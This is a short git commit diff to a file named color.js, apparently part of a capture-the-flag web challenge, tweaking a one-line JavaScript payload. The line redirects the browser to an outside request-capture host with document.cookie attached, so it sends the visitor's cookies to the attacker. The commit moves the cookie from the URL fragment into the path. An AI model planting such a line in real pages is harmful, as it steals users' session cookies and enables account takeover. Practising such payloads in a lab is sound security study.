25d14246564691bfdb049ed16f7c9ca7aa717892
LcMauri <94177490+LcMauri@users.noreply.github.com>
2025-03-15 20:28:06 +0100

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,1 +1,1 @@
-window.location.href = "https://nootceptor.free.beeceptor.com/#user=abcd;flag=" + encodeURIComponent(document.cookie);
+window.location.href = "https://nootceptor.free.beeceptor.com/user=abcd;flag=" + encodeURIComponent(document.cookie);
